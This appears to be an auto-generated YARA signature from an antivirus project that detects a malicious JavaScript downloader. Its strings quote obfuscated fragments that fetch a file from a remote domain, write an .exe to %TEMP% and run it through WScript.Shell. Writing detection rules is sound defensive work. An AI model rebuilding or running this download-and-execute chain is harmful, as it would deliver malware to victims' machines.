rule sig_20160329_3abf296330eda73f9f0a8543fa2d443c {
  meta:
    description = "datamaliciousorder - file 20160329_3abf296330eda73f9f0a8543fa2d443c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "912701bac623f3a26056f81bfe094794b73f99a8f62b7035d5254ae19b497ea3"

  strings:
    $s1  = "MY[ga](\"GET\", \"http://xn--kandypriv-j4a.com/lo4sad\", false);" fullword ascii
    $s2  = "function b() {return f0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"H5MBO4Zxk7n.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[uZ](HC() * 11); if (MY[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function bQ(C0, N){j = j * 1; return C0 - N;};" fullword ascii
    $s5  = "var f0 = function k() {return WScript[k0](\"WScript.Shell\");}(), Pr = 11;" fullword ascii
    $s6  = "function vG(){return \"\" + v;};" fullword ascii
    $s7  = "function eD(K){f0[\"Run\"](K, j, j);};" fullword ascii
    $s8  = "function Br() {return ((I == true) && (I == Vl)) ? 1 : j;};" fullword ascii
    $s9  = "return bQ(T, Hm);" fullword ascii
    $s10 = " while (D){" fullword ascii
    $s11 = "function HC(){return 22;};" fullword ascii
    $s12 = "function tJ(gs) {var hO = (1, 2, 3, 4, 5, gs); return hO;};" fullword ascii
    $s13 = "function Y()" fullword ascii
    $s14 = "var zw = new this[\"Date\"]();" fullword ascii
    $s15 = "function f(){return k0;};" fullword ascii
    $s16 = "var K0 = false;" fullword ascii
    $s17 = "var Vl = false;" fullword ascii
    $s18 = "var I = false;" fullword ascii
    $s19 = "I = true; " fullword ascii
    $s20 = "Vl = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}